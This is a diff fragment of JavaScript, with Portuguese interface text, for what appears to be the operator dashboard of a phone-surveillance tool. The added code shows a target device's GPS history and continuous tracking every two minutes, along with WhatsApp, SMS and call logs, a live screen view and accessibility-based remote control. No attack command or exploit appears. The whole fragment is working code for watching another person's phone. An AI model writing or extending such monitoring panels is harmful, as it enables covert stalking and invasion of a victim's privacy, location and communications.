+  }catch(e){box.innerHTML='<div class="tiny" style="color:var(--er)">Falhou.</div>'}
+};
+function pintarLocHist(hist){
+  const el=document.getElementById('locHist');if(!el)return;
+  if(!hist||!hist.length){el.innerHTML='<div class="empty">Sem histórico ainda.</div>';return}
+  el.innerHTML=hist.map(h=>`<div class="loc-entry"><span>📍</span><span>${(+h.lat).toFixed(5)}, ${(+h.lng).toFixed(5)} · ~${Math.round(h.prec||0)} m</span><span class="ts">${new Date(+h.quando).toLocaleString('pt-PT')}</span><a href="${esc(h.maps||'')}" target="_blank" rel="noopener">Mapa</a></div>`).join('');
+}
+function carregarLocHist(){
+  let hist=[];try{hist=JSON.parse(localStorage.getItem('ftxLocHist')||'[]')}catch(e){}
+  pintarLocHist(hist);
+}
+const locHistRef=document.getElementById('locHistRef');
+if(locHistRef)locHistRef.onclick=()=>{if(btnLocal2)btnLocal2.click()};
+// btnTrack continuous
+const btnTrack=document.getElementById('btnTrack');
+let trackInterval=null;
+if(btnTrack)btnTrack.onclick=function(){
+  if(trackInterval){clearInterval(trackInterval);trackInterval=null;this.textContent='▶ Rastreio contínuo';this.className='btn ok';toast('Rastreio parado');return}
+  this.textContent='⏹ Parar rastreio';this.className='btn er';toast('Rastreio a cada 2 min');
+  if(btnLocal2)btnLocal2.click();
+  trackInterval=setInterval(()=>{if(btnLocal2)btnLocal2.click()},120000);
+};
+// Logs de mensagens e chamadas no modo avançado
+async function carregarAdvLogs(){
+  const ml=document.getElementById('advMsgLog'),cl=document.getElementById('advCallLog');
+  if(ml){try{
+    const all=[];
+    WA_CONVS.slice(0,5).forEach(c=>all.push({app:'WhatsApp',nome:c.conversa,sub:c.ultima_msg||'',ts:c.ultima_ts||0}));
+    if(SMS.length>0){const s=SMS[0];all.push({app:'SMS',nome:nomeDe(s.de)||s.de,sub:s.texto,ts:s.data||0})}
+    all.sort((a,b)=>b.ts-a.ts);
+    if(!all.length){ml.innerHTML='<div class="empty">Sem dados.</div>';}
+    else ml.innerHTML=all.map(x=>`<div class="log-entry"><span class="ts2">${horaWa(x.ts)}</span><b>${esc(x.app)}: ${esc(x.nome)}</b><div class="sub">${esc(x.sub)}</div></div>`).join('');
+  }catch(e){ml.innerHTML='<div class="empty">—</div>'}}
+  if(cl){try{
+    if(!CALLS.length)await syncCalls();
+    if(!CALLS.length){cl.innerHTML='<div class="empty">Sem chamadas.</div>';}
+    else cl.innerHTML=CALLS.slice(0,15).map(c=>`<div class="log-entry"><span class="ts2">${horaWa(c.data)}</span><b>${esc(nomeDe(c.numero)||c.numero)}</b><div class="sub">${esc({recebida:'📲 Recebida',feita:'📞 Feita',perdida:'⚠️ Perdida',rejeitada:'🚫 Rejeitada'}[c.tipo]||c.tipo)} · ${esc(duracaoStr(c.duracao))}</div></div>`).join('');
+  }catch(e){cl.innerHTML='<div class="empty">—</div>'}}
+}
+function pintarPermStatusAdv(){
+  const el=document.getElementById('permStatusAdv');if(!el)return;
+  const perms=[
+    {ok:!!S.controlo,nome:'Acessibilidade (controlo)',emoji:'🖱️'},
+    {ok:!!S.notif,nome:'Notificações',emoji:'🔔'},
+    {ok:!!S.ecra,nome:'Ecrã ao vivo',emoji:'🖥️'},
+  ];
+  el.innerHTML=perms.map(p=>`<div class="perm"><span class="s ${p.ok?'ok':'no'}">${p.emoji}</span><div><b>${p.nome}</b><span>${p.ok?'✅ Ativo e permanente':'⚠️ Por ativar'}</span></div></div>`).join('');
+}
+const btnReativarPerms=document.getElementById('btnReativarPerms');
+if(btnReativarPerms)btnReativarPerms.onclick=()=>{ir('def');setTimeout(()=>{$('#setnav button[data-s="sPer"]')?.click()},100)};
+
+// ===== Dashboard — atividade recente e contadores =====
+async function atualizarAtividade(){
+  const feed=document.getElementById('actFeed');if(!feed)return;
+  const items=[];
+  WA_CONVS.slice(0,4).forEach(c=>c.ultima_ts&&items.push({ico:'💬',bg:'#25d366',title:c.conversa||'?',sub:c.ultima_msg||'',ts:c.ultima_ts}));
+  SMS.slice(0,3).forEach(m=>items.push({ico:'📱',bg:'var(--ac)',title:nomeDe(m.de)||m.de,sub:m.texto,ts:m.data}));
+  CALLS.slice(0,2).forEach(c=>items.push({ico:'📞',bg:'var(--ok)',title:nomeDe(c.numero)||c.numero,sub:{recebida:'Recebida',feita:'Feita',perdida:'Perdida',rejeitada:'Rejeitada'}[c.tipo]||c.tipo,ts:c.data}));
+  items.sort((a,b)=>b.ts-a.ts);
+  if(!items.length){feed.innerHTML='<div class="empty" style="padding:18px 0">A aguardar atividade…</div>';return}
+  feed.innerHTML=items.slice(0,8).map(it=>`<div class="act-item"><div class="aic" style="background:color-mix(in srgb,${esc(it.bg)} 18%,transparent)">${esc(it.ico)}</div><div class="atx"><b>${esc(it.title)}</b><span>${esc(it.sub||'')}</span></div><div class="att">${horaWa(it.ts)}</div></div>`).join('');
+}
+function atualizarContadores(){
+  const cs=conversas();
+  const el=document.getElementById('pSmsCt');if(el)el.textContent=cs.length||'0';
+  const ew=document.getElementById('pWaCt');if(ew)ew.textContent=WA_CONVS.length||'0';
+  const ec=document.getElementById('pCallCt');if(ec)ec.textContent=CALLS.length||'0';
+}
+async function atualizarSocCt(){
+  try{const r=await get('/social-convs');const el=document.getElementById('pSocCt');if(el)el.textContent=(r.lista||[]).length||'0'}catch(e){}
+}
+// Extend ir() to also update dashboard
+const _irOrig=ir;
+function ir(v){
+  _irOrig(v);
+  if(v==='painel'){
+    atualizarContadores();
+    atualizarAtividade();
+    atualizarSocCt();
+    // Connection status
+    const dot=document.getElementById('connDot'),txt=document.getElementById('connTxt'),s2=document.getElementById('sessao2');
+    if(dot&&txt){const on=!!S.controlo||!!S.notif;dot.className='dot'+(on?' on':'');txt.textContent=S.ecra?'Ligado (ecrã ao vivo)':on?'Ligado':'A ligar…'}
+    if(s2)s2.textContent=S.id?'ID: '+S.id:RELAY?'Remoto':'Rede local';
+  }
+  if(v==='adv'&&ADV)pintarPermStatusAdv();
+}
+// Update dashboard counters on each sync
+const _syncSmsOrig=syncSms;
+// Patch syncSms to also update counters
+function syncSms(){return _syncSmsOrig.apply(this,arguments).then(()=>{if(VISTA==='painel'){atualizarContadores();atualizarAtividade()}})}
+
+// ===== Mark conversation as read (WA + Social) =====
+function marcarConvLida(tipo,chave){
+  try{localStorage.setItem('ftxRead_'+tipo+'_'+chave,Date.now())}catch(e){}
+}
+function lerConvLida(tipo,chave){
+  try{return parseInt(localStorage.getItem('ftxRead_'+tipo+'_'+chave)||'0')}catch(e){return 0}
+}
+// Patch WA conversation click to mark as read
+document.getElementById('waConvs').addEventListener('click',function(e){
+  const item=e.target.closest('.wa-conv');if(!item)return;
+  marcarConvLida('wa',item.dataset.chave);
+  // Remove unread badge from this conversation
+  const nb=item.querySelector('.nb');if(nb)nb.remove();
+  // Recount WA unread for main badge
+  const unread=document.querySelectorAll('#waConvs .nb').length;
+  badge('wa',unread);
+},{capture:false});
 
 // ===== Notificações em tempo real (long-poll /events) =====
 let eventosOn=false;
